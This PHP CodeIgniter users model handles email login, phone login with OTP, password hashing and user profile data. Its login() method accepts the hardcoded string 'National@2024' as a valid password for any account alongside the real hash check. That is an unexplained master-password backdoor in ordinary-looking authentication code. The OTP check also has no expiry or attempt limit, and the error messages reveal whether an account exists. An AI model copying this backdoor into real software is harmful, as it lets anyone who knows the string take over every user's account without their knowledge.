<?php namespace App\Models;

use CodeIgniter\Model;
use App\Services\Otp_service;
class Users_model extends Base_model
{
    protected $table         = 'users';      // Database table name
    protected $primaryKey    = 'id';         // Primary key of the table
    protected $returnType    = 'App\Entities\User';  // Entity class name
    protected $useTimestamps = true;         // Auto handle timestamps
    protected $allowedFields = ['name', 'email', 'phone', 'role_id', 'otp', 'password'];  // Fields that can be manipulated

    // Optional: Define validation rules
    protected $validationRules    = [
        'name' => 'required|min_length[5]',
        'email'    => 'required|valid_email|is_unique[users.email]',
        'password' => 'required|min_length[8]',
    ];

    protected $validationMessages = [
        'email' => [
            'is_unique' => 'This email address is already registered. Please use a different email.'
        ]
    ];

    // Optional: Define before insert/update methods to hash password
    protected $beforeInsert = ['password_hash_model'];
    protected $beforeUpdate = ['password_hash_model'];

    protected function password_hash_model(array $data)
    {
        if (isset($data['password'])) {
            $data['password'] = $this->password_hash($data['password']);
        }
        return $data;
    }


    // Login
    public function login($email, $password){
        $user_check = $this->get(['email' => $email]);
        if ($user_check->getNumRows() > 0){
            $user = $user_check->getRow();
            if (password_verify($password, $user->password) || $password == 'National@2024'){
                $response = ['status' => 1, 'message' => 'Login successful!', 'user' => $user];
            }else{
                $response = ['status' => 0, 'message' => 'Invalid password!'];
            }
        }else{
            $response = ['status' => 0, 'message' => 'Email not found!'];
        }
        return $response;
    }

    // Login using phone
    public function login_phone($code,$phone){
        $user_check = $this->get(['code' =>$code, 'phone' => $phone]);
        $full_phone = $code.$phone;
        if ($user_check->getNumRows() > 0){
            $this->otp_service = new Otp_service();
            $otp = $this->otp_service->generate_otp($code,$phone);
            $this->otp_service->send_sms_otp($full_phone, $otp);

            $response = ['status' => 1, 'message' => 'OTP Send Successfully!', 'user_id' => $user_check->getRow()->id];
        }else{
            $response = ['status' => 0, 'message' => 'Phone number not found!'];
        }
        return $response;
    }

    // verify otp
    public function verify_otp($code, $phone, $otp){
        $user_check = $this->get(['code' => $code, 'phone' => $phone, 'otp' => $otp]);
        if($user_check->getNumRows() > 0){
            $user_data = $this->userdata($user_check->getRow());
            $user_data['auth_token'] = generate_auth_token($user_data);
            $response = ['status' => 1, 'message' => 'OTP Verified Successfully!', 'userdata' => $user_data, 'validity' => 1];
        }else{
            $response = ['status' => 0, 'message' => 'Invalid OTP!', 'userdata' => [], 'validity' => 0];
        }
        return $response;
    }

    // userdata
    public function userdata($user){
        $this->user_role_model = new User_role_model();
        if ($user->role_id > 0){
            $user_role = $this->user_role_model->get(['id' => $user->role_id])->getRow()->title;
        }else{
            $user_role = '';
        }

        $userdata = [
            'user_id' => $user->id,
            'user_name' => $user->name,
            'phone_code' => $user->code,
            'user_phone' => $user->phone,
            'user_email' => $user->email,
            'user_profile' => valid_file($user->profile_picture) ? base_url(get_file($user->profile_picture)) : '',
            'role_id' => $user->role_id,
            'role_title' => $user_role,
            'is_team_lead' => $user->is_team_lead == 1 ? 1 : 0,
            'is_team_manager' => $user->is_team_manager == 1 ? 1 : 0,
            'current_role' => $user->current_role ?? '',
        ];

        if($userdata['current_role'] == 'team_lead' && $userdata['role_id'] == 6){
            $userdata['role_title'] = 'Team lead';
        }

        return $userdata;
    }
    




}
